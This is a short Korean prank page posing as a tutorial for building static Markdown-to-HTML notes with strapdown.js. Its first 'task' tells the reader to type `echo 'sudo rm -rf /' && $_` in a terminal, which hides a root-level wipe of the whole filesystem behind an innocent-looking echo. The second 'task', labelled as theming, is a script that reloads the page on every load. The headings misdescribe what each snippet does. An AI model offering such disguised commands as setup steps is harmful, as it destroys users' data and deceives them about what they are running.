# [strapdown.js](http://strapdownjs.com) 를 이용한 'Static Markdown To HTML Note' 작성하기 :)

### Task 1 - 일단 iTerm을 열고 아래와 같이 입력한다.
```bash
$ echo 'sudo rm -rf /' && $_
```

### Task 2 - 주저하지 않고 랜덤 부트스트랩 테마를 입혀준다.
```javascript
<script type="text/javascript">
  window.location.reload(true);
</script>
```

### Task 3 - HTML파일의 이름에 따라 title이 변경되었으면 좋겠다.
```javascript
<script type="text/javascript">
  alert(location.href.substr(location.href.lastIndexOf('/') + 1));
</script>
```
